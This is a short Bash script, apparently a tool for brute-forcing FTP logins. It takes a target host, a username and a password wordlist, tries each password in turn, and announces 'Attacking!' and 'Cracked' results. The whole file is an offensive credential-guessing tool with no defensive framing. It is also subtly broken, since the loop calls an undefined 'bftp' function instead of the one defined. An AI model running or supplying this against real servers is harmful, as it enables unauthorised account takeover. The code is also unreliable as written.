#!/bin/bash

function ftpbruteforce {

comp=$(ftp -n "$1" <<_CONEXAO
quote USER $2
quote PASS $3
quit
_CONEXAO
)

if [ "$comp" = "Login incorrect." ]
	then
		return 1
	else
		return 0
fi

}

function helper {
b="\nFTP BRUTEFORCE\n\n
Uso:\n\n
-t <host|ip>\n
-w <wordlist>\n
-u <user>\n\n
Ex: `basename $0` -t 127.132.0.1 -w /tmp/passwords.txt -u admin\n
"
echo -e $b
exit 1
}

[ "$1" ] || helper

while getopts t:w:u: OPT;
 do
	case "$OPT" in
		"t") host="${OPTARG}" ;;
		"w") wordlist="${OPTARG}" ;;
		"u") usuario="${OPTARG}" ;;
		"?") helper ;;
	esac
done

[ $host ] || helper;
[ $wordlist ] || helper;
[ $usuario ] || helper;

echo -e "\n============== Attacking! ==============\n\n Target => $host\n User => $usuario\n Wordlist => `wc -l $wordlist | awk '{print $1}'` strings to test\n\n======================================\n\n"

for pass in `cat $wordlist`
 do
 	echo -e "\033[1;34m[*]\033[0m Testing => $pass"
	a=$(bftp $host $usuario $pass)
	b=$(echo $?)
	if [ "$b" = "1" ]
	then
		echo -e "\033[1;31m[-]\033[0m ERROR"
	else
		echo -e "\n\033[40;1;37m[+] Cracked: $pass\033[0m\n"
		break
	fi
done
